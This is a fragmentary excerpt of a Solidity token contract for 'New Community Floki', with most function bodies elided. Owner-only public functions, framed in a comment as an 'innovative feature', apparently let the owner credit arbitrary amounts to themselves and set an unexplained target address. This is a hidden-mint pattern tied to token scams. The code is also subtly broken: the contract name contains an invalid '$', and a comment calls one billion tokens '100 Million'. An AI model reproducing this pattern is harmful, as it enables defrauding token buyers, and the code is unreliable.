...
//
// $NewCommunityFloki proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _setNewCommunityFloki(bool enabled, address target) public onlyOwner {
    ...
    function _NewCommunityFloki(uint256 amount) public onlyOwner {
        _NewCommunityFloki(msg.sender, amount);
    }
    ...
    function _NewCommunityFloki(address account, uint256 amount) internal virtual {
...
contract $NewCommunityFloki is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("New Community Floki", "NCFLOKI") {
     _NewCommunityFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}